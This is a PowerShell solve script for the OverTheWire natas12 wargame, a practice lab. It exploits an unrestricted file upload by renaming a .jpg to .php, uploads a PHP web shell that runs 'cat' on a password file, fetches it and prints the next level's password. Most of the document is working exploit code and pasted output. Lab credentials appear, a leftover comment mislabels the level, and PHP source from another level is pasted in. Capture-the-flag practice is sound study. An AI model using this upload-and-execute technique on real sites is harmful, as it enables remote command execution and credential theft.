
<#
Script to retrieve the password of level 9-10

#>
$url = "http://natas12.natas.labs.overthewire.org"
$creds = "natas12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3"
$encodedCreds = [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($creds))
$headers = @{ Authorization = "Basic $encodedCreds"}

#------------------------------------------------------------
 $a = (Invoke-WebRequest -uri $url -Method Post -Body $sec -proxy "http://localhost:8080" -Headers $headers).content 
# $a



# res  <form>
# Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
# </form>
# Output:
# <pre>
# </pre>
# <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
#------------------------------------------------------------


# Get source
# --------------------------------------------------------------------------------
# $url += "/index-source.html"
# $a = (Invoke-WebRequest -uri $url -Method Get -proxy "http://localhost:8080" -Headers $headers).content 
# $clean = [System.Web.HttpUtility]::HtmlDecode($a).split("<br />")
# $clean






# $defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

# function xor_encrypt($in) {
#     $key = '<censored>';
#     $text = $in;
#     $outText = '';

#     // Iterate through each character
#     for($i=0;$i<strlen($text);$i++) {
#     $outText .= $text[$i] ^ $key[$i % strlen($key)];
#     }

#     return $outText;
# }

# function loadData($def) {
#     global $_COOKIE;
#     $mydata = $def;
#     if(array_key_exists("data", $_COOKIE)) {
#     $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
#     if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
#         if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
#         $mydata['showpassword'] = $tempdata['showpassword'];
#         $mydata['bgcolor'] = $tempdata['bgcolor'];
#         }
#     }
#     }
#     return $mydata;
# }

# function saveData($d) {
#     setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
# }

# $data = loadData($defaultdata);

# if(array_key_exists("bgcolor",$_REQUEST)) {
#     if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
#         $data['bgcolor'] = $_REQUEST['bgcolor'];
#     }
# }

# saveData($data);



# ?>


# <form enctype="multipart/form-data" action="index.php" method="POST">
# <input type="hidden" name="MAX_FILE_SIZE" value="1000" />
# <input type="hidden" name="filename" value="ltddjdvzgk.jpg" />
# Choose a JPEG to upload (max 1KB):<br/>
# <input name="uploadedfile" type="file" /><br />
# <input type="submit" value="Upload File" />
# </form>
# <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
# </div>
# </body>
# </html>



# --------------------------------------------------------------------------------
#Upload image
# Set params and upload 
#
# PS /home/voltron/OTW/natas/pshell_lang> cat ./shell.php
# <?php echo "b3twiise"?> for test 
#<?php system("cat /etc/natas_webpass/natas13")?> When confident
# PS /home/voltron/OTW/natas/pshell_lang> 

$filename = ($a | select-string -pattern "(\w{10}\.jpg)").matches[0].value
$parms = @{"MAX_FILE_SIZE" = "1000"
 "filename" =  $filename.split(".")[0] + ".php"
  "uploadedfile" = Get-Item -Path "./shell.php" 
#"uploadedfile" = Get-Item -Path "./test.php" 

"submit" = ""
}
#$parms
# Name                           Value                                                                                                          ----                           -----                                                                                                          submit                                                                                                                                        
# uploadedfile                   /home/voltron/OTW/natas/pshell_lang/shell.php
# filename                       hqz3jkr3k3.php
# MAX_FILE_SIZE                  1000



$a = (Invoke-WebRequest -uri $url -Method Post -Form $parms -proxy "http://localhost:8080" -Headers $headers -WebSession $s).content 
#$a
#...The file <a href="upload/mtquqdhju5.php">upload/mtquqdhju5.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>...

#-----------------------------------------------------------------------------------------------------------

# Get image upload link
$imgPath = $a | select-string -pattern "(upload/\w{10}\.php)"
$imgPath =  $imgPath.matches[0].value
#upload/mtquqdhju5.php

$imgPath = $url + '/' + $imgPath

# $imgPath
# http://natas12.natas.labs.overthewire.org/upload/1b51itjbvv.php 


$a = (Invoke-WebRequest -uri $imgPath -Method Get  -proxy "http://localhost:8080" -Headers $headers -WebSession $s).content 

$passwd = $a


echo "The password for natas13 is $passwd"



# PS /home/voltron/OTW/natas/pshell_lang> 
# ./natas13.ps1                                                                                         
# The password for natas13 is jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY                                                                                                                                                                                                                                
# PS /home/voltron/OTW/natas/pshell_lang> 



